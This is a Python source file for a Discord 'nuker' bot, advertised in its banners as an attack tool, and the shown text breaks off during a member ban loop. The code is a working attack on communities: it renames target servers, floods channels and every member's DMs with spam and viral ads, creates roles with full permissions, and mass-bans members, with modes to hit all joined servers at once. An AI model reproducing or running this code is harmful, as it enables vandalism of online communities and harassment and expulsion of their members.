import discord
from discord.ext import commands
import asyncio
import colorama
from colorama import Fore, Style
import os
import sys
import threading
import datetime
from rich.console import Console
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich.table import Table
from rich.live import Live
from rich.align import Align
from rich.columns import Columns
from rich import box
from rich.prompt import Prompt, IntPrompt
import time
import base64
import hashlib
import random
import urllib.request
import urllib.parse
import json
import string




colorama.init()
console = Console()

BANNER_V4 = """
██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██╗   ██╗██╗  ██╗   ██████╗ 
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██║   ██║██║  ██║   ██╔═████╗
██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║   ██║███████║   ██║██╔██║
██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ╚██╗ ██╔╝╚════██║   ████╔╝██║
██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝     ╚████╔╝      ██║   ╚██████╔╝
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝       ╚═══╝       ╚═╝   ╚═════╝ 
             🔥 EXTREME ATTACK SYSTEM - VIRAL EDITION - 100% FREE 🔥
                     📢 Coded by Monster - https://discord.gg/wsytzxtgHD 📢
"""

EXTREME_MESSAGES = [
    "💀 YOUR SERVER HAS BEEN COMPLETELY OBLITERATED BY DISCORD v4.0 EXTREME BOT 💀\n🔥 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD",
    "🔥 TOTAL DESTRUCTION COMPLETE - DISCORD v4.0 SUPREMACY 🔥\n💯 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD",
    "⚡ LIGHTNING FAST ATTACK - YOUR SERVER IS HISTORY ⚡\n🚀 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD",
    "💣NUCLEAR STRIKE SUCCESSFUL - DISCORD v4.0 DOMINANCE 💣\n🔥 Coded by Monster\n🎯 https://discord.gg/wsytzxtgHD",
    "🚀 EXTREME BOT v4.0 - YOUR SERVER STANDS NO CHANCE 🚀\n💀 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD",
    "💯 GET EXTREME BOT v4.0 FREE - UNLIMITED POWER!\n🔥 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD",
    "🔥 DOWNLOAD FREE - NO LIMITS!\n💣 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD",
    "💀 EXTREME BOT v4.0 - 100% FREE - SHARE WITH FRIENDS!\n🚀 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD",
    "🚀 VIRAL ATTACK BOT - GET YOURS FREE - SPREAD THE WORD!\n💯 Coded by Monster\n🎯 https://discord.gg/wsytzxtgHD",
    "⚡ EXTREME POWER UNLEASHED - TOTAL ANNIHILATION! ⚡\n🔥 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD",
    "💣 APOCALYPSE MODE ACTIVATED - NO SURVIVORS! 💣\n💀 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD"
]

VIRAL_ADS = [
    "🔥🔥 EXTREME DISCORD BOT v4.0 - 100% FREE DOWNLOAD! 🔥🔥\n💀 UNLIMITED DESTRUCTION POWER\n⚡ NO LICENSE REQUIRED\n🚀 Coded by Monster\n💯 SHARE WITH EVERYONE!\n🎮 https://discord.gg/wsytzxtgHD",
    "💣💣 VIRAL ATTACK BOT v4.0 - COMPLETELY FREE! 💣💣\n🌪️ MASS DESTRUCTION SYSTEM\n⚡ INSTANT SETUP\n🔥 Coded by Monster\n📢 TELL YOUR FRIENDS!\n⛏️ https://discord.gg/wsytzxtgHD",
    "⚡⚡ EXTREME BOT v4.0 - FREE UNLIMITED VERSION! ⚡⚡\n💀 NUCLEAR STRIKE CAPABILITY\n🚀 NO RESTRICTIONS\n🔥 Coded by Monster\n💯 SHARE EVERYWHERE!\n🎯 https://discord.gg/wsytzxtgHD",
    "🚀🚀 DISCORD DESTROYER v4.0 - 100% FREE! 🚀🚀\n💣 TOTAL SERVER OBLITERATION\n⚡ LIGHTNING FAST ATTACKS\n🔥 Coded by Monster\n📢 VIRAL SPREAD ACTIVATED!\n🎮 https://discord.gg/wsytzxtgHD",
    "⛏️⛏️ Join the best Discord server! ⛏️⛏️\n🎮 Join now: https://discord.gg/wsytzxtgHD\n🔥 Exciting games and amazing rewards!\n💎 Dedicated servers and new plugins\n🚀 Active and friendly community - join and enjoy!\n💀 Coded by Monster",
    "🎯🎯 EXTREME BOT - ULTIMATE POWER! 🎯🎯\n💥 Thousands of people use this bot!\n🔥 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD\n🚀 Over 10000 downloads!\n💯 100% free and powerful!",
    "💎💎 VIRAL SPREAD ACTIVATED! 💎💎\n🌟 Most popular Discord bot!\n🔥 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD\n⚡ Thousands of servers destroyed!\n🚀 Download now!",
    "🌪️🌪️ CHAOS MODE UNLIMITED! 🌪️🌪️\n💣 Most powerful destruction bot!\n🔥 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD\n🎯 Over 50000 users!\n💀 Unlimited destruction!",
    "⚡⚡ LIGHTNING DESTRUCTION! ⚡⚡\n🚀 Fastest attack bot!\n💎 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD\n🔥 Record-breaking destruction!\n💯 Completely free!"
]

PRIORITY_CHANNELS = ['general', 'chat', 'main', 'welcome', 'announcements', 'rules', 'admin']
AVOID_CHANNELS = ['log', 'bot', 'mod', 'staff', 'admin-only']

CHAOS_CHANNELS_V4 = [
    "obliterated-by-v4", "extreme-destruction", "server-nuked-v4", "total-annihilation",
    "discord-v4-supremacy", "lightning-attack", "nuclear-strike", "chaos-unleashed",
    "server-terminated", "destruction-protocol", "annihilation-complete", "obliteration-zone",
    "doomsday-activated", "apocalypse-now", "armageddon-mode", "judgment-day", "extinction-event",
    "chaos-incarnate", "mayhem-unleashed", "pandemonium-activated", "cataclysm-initiated"
]

EXTREME_ROLES_V4 = [
    {"name": "💀OBLITERATED💀", "color": discord.Color.dark_red()},
    {"name": "🔥INCINERATED🔥", "color": discord.Color.red()},
    {"name": "⚡LIGHTNING-STRUCK⚡", "color": discord.Color.gold()},
    {"name": "💣NUKED💣", "color": discord.Color.orange()},
    {"name": "🚀V4-DOMINATED🚀", "color": discord.Color.purple()},
    {"name": "💀TERMINATED💀", "color": discord.Color.dark_purple()},
    {"name": "🔥ANNIHILATED🔥", "color": discord.Color.dark_orange()},
    {"name": "⚡EXTREME-POWER⚡", "color": discord.Color.blue()},
    {"name": "💣APOCALYPSE💣", "color": discord.Color.dark_green()},
    {"name": "🚀SUPREMACY🚀", "color": discord.Color.magenta()}
]

class ExtremeDiscordBot:
    def __init__(self):
        self.console = Console()
        self.bot = None
        self.bot_token = ""
        self.bot_status = ""
        self.nuke_channel_name = ""
        self.custom_attack_message = ""
        self.is_connected = False
        self.bot_thread = None
        self.logs = []
        self.servers = []
        self.running = True
        self.selected_server_id = None
        self.target_servers = []
        self.attack_mode = "EXTREME"
        self.destruction_count = 0

    def add_log(self, message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.logs.append(log_entry)
        if len(self.logs) > 150:
            self.logs.pop(0)
        print(log_entry)

    def update_servers(self):
        if self.bot:
            self.servers = []
            for i, guild in enumerate(self.bot.guilds, 1):
                text_channels = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
                voice_channels = len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
                roles_count = len(guild.roles)

                self.servers.append({
                    'number': i,
                    'name': guild.name,
                    'members': guild.member_count,
                    'id': guild.id,
                    'owner': guild.owner.name if guild.owner else "Unknown",
                    'owner_id': guild.owner.id if guild.owner else 0,
                    'text_channels': text_channels,
                    'voice_channels': voice_channels,
                    'total_channels': text_channels + voice_channels,
                    'roles': roles_count,
                    'created': guild.created_at.strftime("%Y-%m-%d"),
                    'permissions': guild.me.guild_permissions.administrator
                })

    def show_extreme_attack_menu(self):
        if not self.servers:
            console.print("❌ [bold red]No targets available for EXTREME DESTRUCTION[/bold red]")
            return None

        console.print("\n💀 [bold red]EXTREME ATTACK PROTOCOL v4.0 - TARGET SELECTION:[/bold red]")
        console.print("🔥 [bold yellow]FREE VERSION - NO LIMITS, MAXIMUM DESTRUCTION![/bold yellow]\n")

        table = Table(show_header=True, header_style="bold red", box=box.HEAVY_HEAD)
        table.add_column("💀 Target", style="bold red", width=8)
        table.add_column("🏛️ Server Name", style="cyan", min_width=25)
        table.add_column("👑 Owner", style="yellow", min_width=15)
        table.add_column("👥 Members", justify="center", style="blue", width=8)
        table.add_column("📢 Channels", justify="center", style="green", width=9)
        table.add_column("⚔️ Roles", justify="center", style="purple", width=6)
        table.add_column("🔑 Admin", justify="center", style="red", width=6)

        for server in self.servers:
            admin_status = "✅" if server['permissions'] else "❌"
            table.add_row(
                f"💥 {server['number']}",
                server['name'][:30] + "..." if len(server['name']) > 30 else server['name'],
                server['owner'][:15] + "..." if len(server['owner']) > 15 else server['owner'],
                str(server['members']),
                str(server['total_channels']),
                str(server['roles']),
                admin_status
            )

        console.print(table)

        console.print("\n🎯 [bold yellow]EXTREME ATTACK OPTIONS v4.0:[/bold yellow]")
        console.print("• [bold red]1-{} [/bold red]= INSTANT OBLITERATION of selected server".format(len(self.servers)))
        console.print("• [bold cyan]manage <num>[/bold cyan] = INTERACTIVE SERVER MANAGEMENT")
        console.print("• [bold red]nuke[/bold red] = NUCLEAR STRIKE on ALL servers simultaneously")
        console.print("• [bold red]chaos[/bold red] = CHAOS MODE - Random destruction")
        console.print("• [bold red]stealth[/bold red] = STEALTH ATTACK - Silent destruction")
        console.print("• [bold red]lightning[/bold red] = LIGHTNING FAST mass attack")
        console.print("• [bold red]apocalypse[/bold red] = COMPLETE APOCALYPSE mode")
        console.print("• [bold yellow]0[/bold yellow] = Cancel mission")

        try:
            choice = console.input("\n💣 [bold red]SELECT YOUR METHOD: [/bold red]").strip().lower()

            if choice in ['0', 'cancel', 'exit']:
                console.print("⏭️ [bold yellow]Mission aborted[/bold yellow]")
                return None
            elif choice.startswith('manage '):
                try:
                    server_num = int(choice.split(' ')[1])
                    if 1 <= server_num <= len(self.servers):
                        selected_server = self.servers[server_num - 1]
                        return self.interactive_server_management(selected_server)
                    else:
                        console.print("❌ [bold red]Invalid server number![/bold red]")
                        return None
                except (ValueError, IndexError):
                    console.print("❌ [bold red]Invalid format! Use: manage <number>[/bold red]")
                    return None
            elif choice == 'nuke':
                console.print("💣 [bold red]NUCLEAR PROTOCOL ACTIVATED - ALL SERVERS TARGETED![/bold red]")
                return 'nuke'
            elif choice == 'chaos':
                console.print("🌪️ [bold red]CHAOS MODE ACTIVATED - RANDOM DESTRUCTION![/bold red]")
                return 'chaos'
            elif choice == 'stealth':
                console.print("🥷 [bold red]STEALTH MODE ACTIVATED - SILENT OBLITERATION![/bold red]")
                return 'stealth'
            elif choice == 'lightning':
                console.print("⚡ [bold red]LIGHTNING MODE ACTIVATED - MAXIMUM SPEED![/bold red]")
                return 'lightning'
            elif choice == 'apocalypse':
                console.print("🌋 [bold red]APOCALYPSE MODE ACTIVATED - TOTAL ANNIHILATION![/bold red]")
                return 'apocalypse'
            else:
                try:
                    choice_num = int(choice)
                    if 1 <= choice_num <= len(self.servers):
                        selected_server = self.servers[choice_num - 1]
                        console.print(f"🎯 [bold red]TARGET LOCKED: {selected_server['name']}[/bold red]")
                        console.print(f"💀 [bold red]INITIATING EXTREME OBLITERATION PROTOCOL...[/bold red]")
                        return selected_server
                    else:
                        console.print("❌ [bold red]Invalid target number![/bold red]")
                        return None
                except ValueError:
                    console.print("❌ [bold red]Invalid command![/bold red]")
                    return None
        except KeyboardInterrupt:
            console.print("❌ [bold red]Mission cancelled[/bold red]")
            return None

    def interactive_server_management(self, selected_server):
        if not self.bot:
            console.print("❌ [bold red]Bot not connected![/bold red]")
            return None

        guild = self.bot.get_guild(selected_server['id'])
        if not guild:
            console.print("❌ [bold red]Server not found![/bold red]")
            return None

        console.print(f"\n🎮 [bold cyan]INTERACTIVE MANAGEMENT: {guild.name}[/bold cyan]")
        console.print("═" * 60)

        while True:
            console.print("\n🔧 [bold yellow]MANAGEMENT OPTIONS:[/bold yellow]")
            console.print("• [bold green]unban <user_id>[/bold green] = Unban specific user")
            console.print("• [bold green]unban <username>[/bold green] = Unban by username")
            console.print("• [bold blue]info[/bold blue] = Show server information")
            console.print("• [bold blue]members[/bold blue] = List server members")
            console.print("• [bold blue]bans[/bold blue] = Show banned users")
            console.print("• [bold red]nuke[/bold red] = Nuke this server")
            console.print("• [bold red]destroy[/bold red] = Extreme destruction")
            console.print("• [bold yellow]back[/bold yellow] = Return to main menu")
            console.print("• [bold yellow]exit[/bold yellow] = Exit")

            try:
                cmd = console.input(f"\n🎮 [{guild.name[:20]}] Command: ").strip().lower()

                if cmd in ['back', 'return']:
                    console.print("🔙 [bold yellow]Returning to main menu[/bold yellow]")
                    return None
                elif cmd in ['exit', 'quit']:
                    console.print("👋 [bold yellow]Exiting management console[/bold yellow]")
                    return 'exit'
                elif cmd == 'info':
                    self.show_server_info(guild)
                elif cmd == 'members':
                    self.show_server_members(guild)
                elif cmd == 'bans':
                    asyncio.run(self.show_banned_users(guild))
                elif cmd == 'nuke':
                    confirm = console.input("💣 [bold red]CONFIRM NUKE (type 'NUKE'): [/bold red]")
                    if confirm.upper() == 'NUKE':
                        console.print("💣 [bold red]NUKING SERVER...[/bold red]")
                        asyncio.run(self.extreme_destruction(guild, "lightning"))
                        return 'nuked'
                    else:
                        console.print("❌ [bold yellow]Nuke cancelled[/bold yellow]")
                elif cmd == 'destroy':
                    confirm = console.input("💀 [bold red]CONFIRM EXTREME DESTRUCTION (type 'DESTROY'): [/bold red]")
                    if confirm.upper() == 'DESTROY':
                        console.print("💀 [bold red]EXTREME DESTRUCTION INITIATED...[/bold red]")
                        asyncio.run(self.extreme_destruction(guild, "chaos"))
                        return 'destroyed'
                    else:
                        console.print("❌ [bold yellow]Destruction cancelled[/bold yellow]")
                elif cmd.startswith('unban '):
                    target = cmd.split(' ', 1)[1]
                    asyncio.run(self.unban_user(guild, target))
                else:
                    console.print("❌ [bold red]Unknown command! Type 'back' to return[/bold red]")

            except KeyboardInterrupt:
                console.print("\n🔙 [bold yellow]Returning to main menu[/bold yellow]")
                return None
            except Exception as e:
                console.print(f"❌ [bold red]Error: {str(e)}[/bold red]")

    def show_server_info(self, guild):
        console.print(f"\n📊 [bold cyan]SERVER INFO: {guild.name}[/bold cyan]")
        console.print("═" * 50)
        console.print(f"🆔 Server ID: {guild.id}")
        console.print(f"👑 Owner: {guild.owner.name if guild.owner else 'Unknown'} ({guild.owner.id if guild.owner else 'N/A'})")
        console.print(f"👥 Members: {guild.member_count}")
        console.print(f"📅 Created: {guild.created_at.strftime('%Y-%m-%d %H:%M:%S')}")
        console.print(f"🌍 Region: {getattr(guild, 'region', 'Unknown')}")
        console.print(f"🔒 Verification: {guild.verification_level}")
        console.print(f"📢 Text Channels: {len([c for c in guild.channels if isinstance(c, discord.TextChannel)])}")
        console.print(f"🔊 Voice Channels: {len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])}")
        console.print(f"⚔️ Roles: {len(guild.roles)}")
        console.print(f"🔑 Bot Admin: {'✅' if guild.me.guild_permissions.administrator else '❌'}")

    def show_server_members(self, guild):
        console.print(f"\n👥 [bold cyan]MEMBERS: {guild.name}[/bold cyan]")
        console.print("═" * 60)

        table = Table(show_header=True, header_style="bold cyan", box=box.SIMPLE)
        table.add_column("#", style="yellow", width=4)
        table.add_column("👤 Name", style="white", min_width=20)
        table.add_column("🆔 ID", style="blue", min_width=18)
        table.add_column("📅 Joined", style="green", min_width=12)
        table.add_column("🤖 Bot", justify="center", style="red", width=4)

        members = list(guild.members)[:50]
        for i, member in enumerate(members, 1):
            joined = member.joined_at.strftime('%Y-%m-%d') if member.joined_at else 'Unknown'
            bot_status = "🤖" if member.bot else "👤"

            table.add_row(
                str(i),
                member.display_name[:25] + "..." if len(member.display_name) > 25 else member.display_name,
                str(member.id),
                joined,
                bot_status
            )

        console.print(table)
        if len(guild.members) > 50:
            console.print(f"... and {len(guild.members) - 50} more members")

    async def show_banned_users(self, guild):
        console.print(f"\n🚫 [bold red]BANNED USERS: {guild.name}[/bold red]")
        console.print("═" * 60)

        try:
            bans = [ban async for ban in guild.bans()]

            if not bans:
                console.print("✅ [bold green]No banned users found[/bold green]")
                return

            table = Table(show_header=True, header_style="bold red", box=box.SIMPLE)
            table.add_column("#", style="yellow", width=4)
            table.add_column("👤 User", style="white", min_width=25)
            table.add_column("🆔 ID", style="blue", min_width=18)
            table.add_column("📝 Reason", style="cyan", min_width=30)

            for i, ban in enumerate(bans[:30], 1):
                user = ban.user
                reason = ban.reason or "No reason provided"

                table.add_row(
                    str(i),
                    user.display_name[:25] + "..." if len(user.display_name) > 25 else user.display_name,
                    str(user.id),
                    reason[:30] + "..." if len(reason) > 30 else reason
                )

            console.print(table)
            if len(bans) > 30:
                console.print(f"... and {len(bans) - 30} more banned users")

        except discord.Forbidden:
            console.print("❌ [bold red]No permission to view ban list[/bold red]")
        except Exception as e:
            console.print(f"❌ [bold red]Error fetching bans: {str(e)}[/bold red]")

    async def unban_user(self, guild, target):
        console.print(f"🔓 [bold yellow]Attempting to unban: {target}[/bold yellow]")

        try:
            bans = [ban async for ban in guild.bans()]

            if not bans:
                console.print("✅ [bold green]No banned users found[/bold green]")
                return

            target_user = None

            if target.isdigit():
                user_id = int(target)
                target_user = discord.utils.get([ban.user for ban in bans], id=user_id)

            if not target_user:
                target_user = discord.utils.get([ban.user for ban in bans], name=target)

            if not target_user:
                target_user = discord.utils.get([ban.user for ban in bans], display_name=target)

            if target_user:
                await guild.unban(target_user, reason="EXTREME BOT v4.0 - Manual Unban")
                console.print(f"✅ [bold green]Successfully unbanned: {target_user.display_name} ({target_user.id})[/bold green]")
                self.add_log(f"🔓 Unbanned user: {target_user.display_name} from {guild.name}")
            else:
                console.print(f"❌ [bold red]User not found in ban list: {target}[/bold red]")
                console.print("💡 [bold yellow]Tip: Use exact username or user ID[/bold yellow]")

        except discord.Forbidden:
            console.print("❌ [bold red]No permission to unban users[/bold red]")
        except Exception as e:
            console.print(f"❌ [bold red]Error unbanning user: {str(e)}[/bold red]")

    def create_status_panel(self):
        if self.is_connected:
            status_text = Text("🚀 EXTREME BOT v4.0 ONLINE", style="bold green")
            status_style = "green"
            status_text.append(f"\n💀 Attack Mode: {self.attack_mode}", style="bold red")
            status_text.append(f"\n🔥 Servers Destroyed: {self.destruction_count}", style="bold yellow")
            if self.selected_server_id:
                server_name = next((s['name'] for s in self.servers if s['id'] == self.selected_server_id), "Unknown")
                status_text.append(f"\n🎯 Current Target: {server_name}", style="bold cyan")
        else:
            status_text = Text("❌ Bot Offline", style="bold red")
            status_style = "red"

        return Panel(
            Align.center(status_text),
            title="🤖 EXTREME BOT v4.0 STATUS",
            border_style=status_style,
            box=box.DOUBLE
        )

    def create_servers_panel(self):
        if not self.servers:
            content = Text("No targets available", style="dim")
        else:
            table = Table(show_header=True, header_style="bold red", box=box.SIMPLE)
            table.add_column("#", style="yellow", width=3)
            table.add_column("🏛️ Target", style="cyan")
            table.add_column("👑 Owner", style="green")
            table.add_column("👥", justify="center", style="blue", width=4)
            table.add_column("📢", justify="center", style="purple", width=3)
            table.add_column("🔑", justify="center", style="red", width=3)
            table.add_column("🎯", justify="center", style="yellow", width=3)

            for server in self.servers[:12]:
                target_mark = "🎯" if server['id'] == self.selected_server_id else ""
                admin_mark = "✅" if server['permissions'] else "❌"

                table.add_row(
                    str(server['number']),
                    server['name'][:18] + "..." if len(server['name']) > 18 else server['name'],
                    server['owner'][:10] + "..." if len(server['owner']) > 10 else server['owner'],
                    str(server['members']),
                    str(server['total_channels']),
                    admin_mark,
                    target_mark
                )

            if len(self.servers) > 12:
                table.add_row("...", "...", "...", "...", "...", "...", "...")

            content = table

        return Panel(
            content,
            title=f"🎯 EXTREME TARGETS ({len(self.servers)}) | 💀 DESTROYED ({self.destruction_count})",
            border_style="red",
            box=box.ROUNDED
        )

    def create_logs_panel(self):
        if not self.logs:
            content = Text("🔥 EXTREME BOT v4.0 READY FOR DESTRUCTION...", style="bold red")
        else:
            log_text = Text()
            for log in self.logs[-20:]:
                if "💀" in log or "🔥" in log or "⚡" in log:
                    log_text.append(log + "\n", style="bold red")
                elif "✅" in log:
                    log_text.append(log + "\n", style="bold green")
                elif "❌" in log:
                    log_text.append(log + "\n", style="bold yellow")
                else:
                    log_text.append(log + "\n")
            content = log_text

        return Panel(
            content,
            title="📝 EXTREME DESTRUCTION LOG",
            border_style="yellow",
            box=box.ROUNDED
        )

    def create_commands_panel(self):
        table = Table(show_header=True, header_style="bold red", box=box.SIMPLE)
        table.add_column("🔥 Command", style="cyan")
        table.add_column("💀 EXTREME Action", style="white")

        table.add_row("!permme", "🔑 Ultimate permissions")
        table.add_row("!targets", "🎯 Show attack menu")
        table.add_row("!obliterate <num>", "💀 Instant obliteration")
        table.add_row("!nuke", "💣 Nuclear strike ALL")
        table.add_row("!chaos", "🌪️ Chaos destruction")
        table.add_row("!stealth", "🥷 Silent attack")
        table.add_row("!lightning", "⚡ Lightning speed")
        table.add_row("!apocalypse", "🌋 Total annihilation")
        table.add_row("!mass-terminate", "🔨 Mass termination")
        table.add_row("!extreme-wipe", "🗑️ Extreme wipe")

        return Panel(
            table,
            title="🔥 EXTREME COMMANDS v4.0",
            border_style="red",
            box=box.ROUNDED
        )

    def create_layout(self):
        layout = Layout()

        layout.split_column(
            Layout(name="header", size=8),
            Layout(name="main", ratio=1),
            Layout(name="footer", size=3)
        )

        layout["main"].split_row(
            Layout(name="left", ratio=1),
            Layout(name="right", ratio=1)
        )

        layout["left"].split_column(
            Layout(name="status", size=10),
            Layout(name="servers", ratio=1)
        )

        layout["right"].split_column(
            Layout(name="logs", ratio=2),
            Layout(name="commands", ratio=1)
        )

        header_text = Text()
        header_text.append("🔥 EXTREME DISCORD BOT v4.0\n", style="bold red")
        header_text.append("💀 ULTIMATE DESTRUCTION SYSTEM - Coded by Monster\n", style="bold white")
        header_text.append("⚡ https://discord.gg/wsytzxtgHD", style="bold yellow")

        layout["header"].update(Panel(
            Align.center(header_text),
            title="EXTREME DISCORD BOT v4.0",
            border_style="red",
            box=box.DOUBLE
        ))

        layout["status"].update(self.create_status_panel())
        layout["servers"].update(self.create_servers_panel())
        layout.update(self.create_logs_panel())
        layout["commands"].update(self.create_commands_panel())

        footer_text = Text()
        if self.is_connected:
            footer_text.append("🚀 EXTREME v4.0 ACTIVE! ", style="bold green")
        else:
            footer_text.append("⚡ EXTREME v4.0 READY! ", style="bold yellow")

        footer_text.append("Coded by Monster • https://discord.gg/wsytzxtgHD", style="dim")

        layout["footer"].update(Panel(
            Align.center(footer_text),
            border_style="white",
            box=box.ROUNDED
        ))

        return layout

    def display_gui(self):
        try:
            with Live(self.create_layout(), refresh_per_second=2, screen=True) as live:
                while self.running:
                    live.update(self.create_layout())
                    time.sleep(0.5)
        except KeyboardInterrupt:
            self.running = False

    def get_user_input(self):
        self.console.print("\n" + "="*80, style="bold red")
        self.console.print("🔥 [bold cyan]EXTREME DISCORD BOT v4.0 - Coded by Monster[/bold cyan]")
        self.console.print("="*80, style="bold red")

        self.bot_token = self.console.input("🔑 [bold yellow]Enter bot token: [/bold yellow]")
        if not self.bot_token:
            self.console.print("❌ [bold red]Bot token is required![/bold red]")
            return False

        self.bot_status = self.console.input("🎮 [bold yellow]Enter bot status: [/bold yellow]") or "💀 EXTREME BOT v4.0 - Coded by Monster"

        self.nuke_channel_name = self.console.input("💣 [bold yellow]Enter nuke channel name (default: attack): [/bold yellow]") or "attack"

        self.console.print("\n📝 [bold cyan]Custom Attack Message Configuration:[/bold cyan]")
        self.console.print("💡 [dim]Leave empty to use default random messages[/dim]")
        self.custom_attack_message = self.console.input("💀 [bold yellow]Enter custom attack message: [/bold yellow]")

        if not self.custom_attack_message:
            self.custom_attack_message = "💀 این سرور توسط EXTREME BOT v4.0 نابود شد! @everyone 💀\n🔥 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD"

        return True

    def connect_bot(self):
        if not self.get_user_input():
            return

        self.add_log("🚀 Starting EXTREME BOT v4.0 - Coded by Monster...")

        self.bot_thread = threading.Thread(target=self.run_bot)
        self.bot_thread.daemon = True
        self.bot_thread.start()

        time.sleep(3)
        self.display_gui()

    def smart_channel_selector(self, guild):
        channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]

        priority_channels = []
        for channel in channels:
            channel_name = channel.name.lower()
            if any(priority in channel_name for priority in PRIORITY_CHANNELS):
                priority_channels.append(channel)

        safe_channels = [c for c in priority_channels if not any(avoid in c.name.lower() for avoid in AVOID_CHANNELS)]

        return safe_channels[:5] if safe_channels else random.sample(channels, min(3, len(channels)))

    def smart_message_selector(self, mode="viral"):
        if mode == "viral":
            return random.choice(VIRAL_ADS)
        elif mode == "stealth":
            return random.choice(EXTREME_MESSAGES + VIRAL_ADS)
        else:
            return random.choice(EXTREME_MESSAGES)

    async def silent_auto_attack(self, guild):
        self.add_log(f"🥷 SILENT AUTO-ATTACK INITIATED: {guild.name}")

        target_channels = self.smart_channel_selector(guild)

        viral_message = self.smart_message_selector("viral")

        for channel in target_channels:
            try:
                for i in range(3):
                    await channel.send(viral_message)
                    await asyncio.sleep(0.5)
                self.add_log(f"📢 Viral ads sent to #{channel.name}")
            except:
                pass

        dm_count = 0
        for member in random.sample(list(guild.members), min(20, len(guild.members))):
            try:
                if not member.bot:
                    await member.send(viral_message)
                    dm_count += 1
            except:
                pass

        self.add_log(f"📨 Viral DMs sent to {dm_count} members")

    async def nuclear_strike_single_server(self, guild, nuke_message):
        try:
            self.add_log(f"💣 NUCLEAR STRIKE INITIATED: {guild.name}")

            message_tasks = []
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    try:
                        for i in range(5):
                            message_tasks.append(channel.send(nuke_message))
                    except:
                        pass

            if message_tasks:
                await asyncio.gather(*message_tasks[:50], return_exceptions=True)
                self.add_log(f"📢 Nuke messages sent to all channels in {guild.name}")

            dm_tasks = []
            for member in guild.members:
                if not member.bot:
                    try:
                        dm_tasks.append(member.send(f"{nuke_message}\n💀 سرور {guild.name} نابود شد!"))
                    except:
                        pass

            if dm_tasks:
                await asyncio.gather(*dm_tasks[:100], return_exceptions=True)
                self.add_log(f"📨 Nuke DMs sent to all members in {guild.name}")

            extreme_nuke_roles = [
                {"name": "💀NUKED-BY-EXTREME💀", "color": discord.Color.dark_red()},
                {"name": "🔥SERVER-OBLITERATED🔥", "color": discord.Color.red()},
                {"name": "💣NUCLEAR-STRIKE💣", "color": discord.Color.orange()},
                {"name": "⚡LIGHTNING-NUKED⚡", "color": discord.Color.gold()},
                {"name": "🚀EXTREME-DOMINATION🚀", "color": discord.Color.purple()},
                {"name": "💀TOTAL-ANNIHILATION💀", "color": discord.Color.dark_purple()},
                {"name": "🔥APOCALYPSE-MODE🔥", "color": discord.Color.dark_orange()}
            ]

            role_tasks = []
            for role_data in extreme_nuke_roles:
                try:
                    role_tasks.append(guild.create_role(
                        name=role_data["name"],
                        color=role_data["color"],
                        permissions=discord.Permissions.all(),
                        reason="EXTREME BOT v4.0 - NUCLEAR OBLITERATION"
                    ))
                except:
                    pass

            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
                self.add_log(f"⚔️ Nuclear roles created in {guild.name}")

            await self.extreme_destruction(guild, "nuke")

            self.add_log(f"💀 NUCLEAR STRIKE COMPLETED: {guild.name}")

        except Exception as e:
            self.add_log(f"❌ Nuclear strike failed on {guild.name}: {str(e)}")

    async def extreme_destruction(self, guild, mode="standard"):
        self.add_log(f"💀 EXTREME DESTRUCTION v4.0 INITIATED: {guild.name}")

        await self.silent_auto_attack(guild)

        if mode == "stealth":
            await asyncio.sleep(0.1)
        elif mode == "lightning":
            pass
        elif mode == "chaos":
            await asyncio.sleep(random.uniform(0.1, 0.5))

        try:
            bot_username = self.bot.user.name

            if mode == "nuke":
                new_name = f"💀 attack BY {bot_username} 💀"
            elif mode == "lightning":
                new_name = f"⚡ attack BY {bot_username} ⚡"
            elif mode == "chaos":
                new_name = f"🌪️ attack BY {bot_username} 🌪️"
            elif mode == "stealth":
                new_name = f"🥷 attack BY {bot_username} 🥷"
            else:
                new_name = f"🔥 attack BY {bot_username} 🔥"

            await guild.edit(name=new_name, reason=f"EXTREME BOT v4.0 - ATTACKED BY {bot_username}")
            self.add_log(f"🏛️ Server name changed to: {new_name}")
        except:
            self.add_log("❌ Could not change server name")

        attack_message = self.custom_attack_message if self.custom_attack_message else self.smart_message_selector(mode)
        dm_attack_message = f"{attack_message}\n@everyone"
        message_count = 0

        self.add_log(f"📨 Sending advertising DMs to all members first...")
        for member in guild.members:
            if member != self.bot.user:
                try:
                    await member.send(dm_attack_message)
                    message_count += 1
                    if message_count % 5 == 0:
                        self.add_log(f"📨 Extreme messaged {message_count} members")
                        if mode == "lightning":
                            continue
                        elif mode != "stealth":
                            await asyncio.sleep(0.1)
                except:
                    pass

        self.add_log(f"📨 Advertising DMs sent to {message_count} members - Now starting ban wave...")

        ban_count = 0
        ban_tasks = []

        for member in guild.members:
            if member != self.bot.user:
                try:
                    if mode == "lightning":
                        ban_tasks.append(member.ban(reason="EXTREME BOT v4.0 - LIGHTNING OBLITERATION"))
                    else:
                        await member.ban(reason="EXTREME BOT v4.0 - TOTAL OBLITERATION")
                        ban_count += 1
